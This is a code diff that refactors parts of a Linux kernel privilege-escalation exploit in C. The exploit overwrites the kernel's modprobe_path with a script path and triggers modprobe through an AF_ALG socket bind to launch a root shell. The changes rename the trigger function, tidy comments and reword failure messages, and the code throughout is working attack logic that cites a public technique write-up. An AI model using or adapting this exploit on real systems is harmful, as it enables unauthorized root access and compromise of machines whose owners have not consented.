@@ -225,7 +225,7 @@ int get_modprobe_path(char *buf, size_t buf_size)
 		printf("[-] unexpected contents of /proc/sys/kernel/modprobe\n");
 		return EXIT_FAILURE;
 	}
-	buf[len - 1] = 0; /* Skip the line feed '\n' */
+	buf[len - 1] = 0; /* skip the line feed '\n' */
 
 	return EXIT_SUCCESS;
 }
@@ -331,27 +331,25 @@ int prepare_privesc_script(char *path, size_t path_size)
 	return EXIT_SUCCESS;
 }
 
-/* 
- * refers to:
- * https://blog.theori.io/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch-2dcb8f0fae04
-*/
-int modprobe_trigger_sock(void)
+/* See https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch */
+int trigger_modprobe_sock(void)
 {
-	struct sockaddr_alg sa;
+	struct sockaddr_alg sa = {
+		.salg_family = AF_ALG,
+		.salg_type = "dummy"
+	};
+	int alg_fd = -1;
 
-	int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
 	if (alg_fd < 0) {
-		perror("[-] crypto socker setup\n");
+		perror("[-] crypto socket");
 		return EXIT_FAILURE;
 	}
 
-	memset(&sa, 0, sizeof(sa));
-	sa.salg_family = AF_ALG;
-	strcpy((char *)sa.salg_type, "dummy"); /* dummy string */
+	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)); /* launch the root shell */
 
-	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)); /* This should not return */
-
-	return 0;
+	printf("[+] root shell is finished\n");
+	return EXIT_SUCCESS;
 }
 
 int main(void)
@@ -503,14 +501,15 @@ int main(void)
 		memcpy(modprobe_path_uaddr, privesc_script_path, new_len + 1); /* with null byte */
 		printf("[+] modprobe_path is changed to %s\n", privesc_script_path);
 
-		/* TODO: refactoring */
-				ret = modprobe_trigger_sock();
-				if (ret == EXIT_FAILURE)
-					goto end;
-				break;
+		/* Launch the root shell */
+		ret = trigger_modprobe_sock();
+		if (ret == EXIT_FAILURE)
+			break;
+		else
+			goto end; /* root shell is finished */
 	}
 
-	printf("[-] exploit failed\n");
+	printf("[-] failed to find / overwrite / trigger modprobe\n");
 
 end:
 	if (act_fd >= 0) {
